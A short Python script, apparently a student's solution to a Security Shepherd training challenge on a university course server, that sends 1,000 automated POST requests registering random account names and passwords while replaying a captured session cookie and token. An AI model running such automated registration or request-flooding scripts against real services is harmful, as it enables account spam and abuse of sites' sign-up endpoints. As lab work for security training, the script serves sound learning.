import requests, random, string

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

url = "https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cReg"

payload = 'accountNumber='
headers = {
  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0',
  'Accept': '*/*',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate, br, zstd',
  'Content-Type': 'application/x-www-form-urlencoded',
  'X-Requested-With': 'XMLHttpRequest',
  'Origin': 'https://shepherd.hs25.isf.hslu-edu.ch',
  'Connection': 'keep-alive',
  'Referer': 'https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp',
  'Cookie': 'JSESSIONID=4F897512BBCF7741E3AF84B64BB17B7E; token=102288616228792200974997167174690941873',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'TE': 'trailers'
}

for i in range(0,1000):
  name = randomword(12)
  pw = randomword(12)
  payload = f'accountHolder={name}&accountPass={pw}'
  response = requests.request("POST", url, headers=headers, data=payload)
  print(f'{i}: {name} {pw} {response.text}')